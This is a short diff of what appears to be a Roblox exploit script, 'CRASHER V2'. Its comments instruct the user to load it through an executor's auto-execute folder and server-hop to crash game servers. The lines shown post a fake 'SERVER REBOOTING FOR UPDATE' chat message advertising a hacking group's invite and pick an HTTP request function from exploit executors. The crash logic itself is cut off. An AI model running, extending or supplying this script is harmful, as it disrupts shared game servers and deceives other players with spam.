@@ -1,5 +1,6 @@
 -- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
 -- CRASHER V2
+warn("water_hax")
 game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("SERVER REBOOTING FOR UPDATE WARNING JOIN cBKaHEGptc - TEAM HAXA")
 task.wait()
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
